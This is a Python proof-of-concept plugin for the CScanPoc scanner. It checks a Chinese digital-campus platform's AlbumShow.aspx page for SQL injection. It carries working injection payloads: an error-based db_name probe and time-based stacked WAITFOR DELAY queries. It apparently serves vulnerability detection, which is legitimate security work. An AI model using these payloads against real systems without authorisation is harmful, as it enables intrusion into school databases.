# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Haohanjy_0001'  # 平台漏洞编号，留空
    name = '育友教育通用数字化校园平台 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-07-25'  # 漏洞公布时间
    desc = '''
        皓翰数字化校园平台是由浙江皓翰教育科技有限公司推出的一款校园管理软件。
        浙江皓翰教育科技有限公司通用数字化校园平台存在SQL注入漏洞。
        /IneduPortal/Components/albums/AlbumShow.aspx?id=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0128557'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '育友数字化校园平台'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '56767962-9765-46c0-850d-af4304bc5400'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2015-0128557
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/IneduPortal/Components/albums/AlbumShow.aspx?id=1'
            getdata = '%20and%20db_name%281%29%3E1--'
            code, head, res, errcode, _ = hh.http(arg + payload + getdata)
            if code == 500 and 'master' in res:
                #security_hole(arg + payload + "   :sql Injection")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
                return

            getdata1 = '%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--%0A'
            getdata2 = '%3BWAITFOR%20DELAY%20%270%3A0%3A0%27--%0A'
            t1 = time.time()
            code, head, res, errcode, _ = hh.http(arg + payload + getdata1)
            t2 = time.time()
            code, head, res, errcode, _ = hh.http(arg + payload + getdata2)
            t3 = time.time()
            if code == 200 and (2*t2 - t1 - t3 > 3):
                #security_hole(arg + payload + "   :sql Injection")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
